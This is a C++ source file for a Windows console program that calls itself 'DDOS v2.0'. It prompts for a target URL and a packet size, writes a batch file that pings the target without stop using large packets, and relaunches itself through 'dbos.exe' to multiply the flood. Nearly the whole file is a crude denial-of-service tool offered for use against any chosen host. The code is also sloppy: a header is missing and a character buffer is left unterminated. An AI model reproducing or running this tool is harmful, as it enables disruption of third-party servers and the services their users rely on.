#include <iostream>
#include <Windows.h>
#include <string>
using namespace std;
void anim();
int main()
{
	anim();
	system("color 3");
	cout << "#####     #####      ######      #####      " << endl
		<< "##  ##    ##  ##    ##    ##    ##   ##     " << endl
		<< "##  ##    ####      ##    ##     ###        " << endl
		<< "##  ##    ##  ##    ##    ##        ###     " << endl
		<< "#####     #####      ######     ##____##    " << endl << "v2.0\n";
	cout << "Enter URL as target( example www.google.com ): ";
	string url;
	cin >> url;
	cout << "Enter size of the packets( 1000 or 50000 ): ";
	string size;
	cin >> size;
	string ping = "start dbos.exe && ping ";
	string flud = " -t -l ";
	char zap[800];
	int k = 0;
	string full = ping + url + flud + size;
	for (int i = 0; i < ping.size(); i++)
		zap[k++] = ping[i];
	for (int i = 0; i < url.size(); i++)
		zap[k++] = url[i];
	for (int i = 0; i < flud.size(); i++)
		zap[k++] = flud[i];
	for (int i = 0; i < size.size(); i++)
		zap[k++] = size[i];
	ofstream file("Butch.bat");
	file << zap;
	system("start Butch.bat");
}

void anim() {
	cout << "S";
	Sleep(50);
	system("cls");
	cout << "OS";
	Sleep(50);
	system("cls");
	cout << "DOS";
	Sleep(50);
	system("cls");
	cout << "DDOS";
	Sleep(50);
	system("cls");
	cout << " DDOS";
	Sleep(50);
	system("cls");
	cout << "  DDOS";
	Sleep(50);
	system("cls");
	cout << "   DDOS";
	Sleep(50);
	system("cls");
	cout << "    DDOS";
	Sleep(50);
	system("cls");
	cout << "     DDOS";
	Sleep(50);
	system("cls");
	cout << "      DDOS";
	Sleep(50);
	system("cls");
	cout << "       DDOS";
	Sleep(50);
	system("cls");
	cout << "        DDOS";
	Sleep(50);
	system("cls");
	cout << "         DDOS";
	Sleep(50);
	system("cls");
	cout << "          DDOS";
	Sleep(50);
	system("cls");
	cout << "           DDOS";
	Sleep(50);
	system("cls");
	cout << "            DDOS";
	Sleep(50);
	system("cls");
	cout << "             DDOS";
	Sleep(50);
	system("cls");
	cout << "              DDOS";
	Sleep(50);
	system("cls");
	cout << "               DDOS";
	Sleep(50);
	system("cls");
	cout << "                DDOS";
	Sleep(50);
	system("cls");
}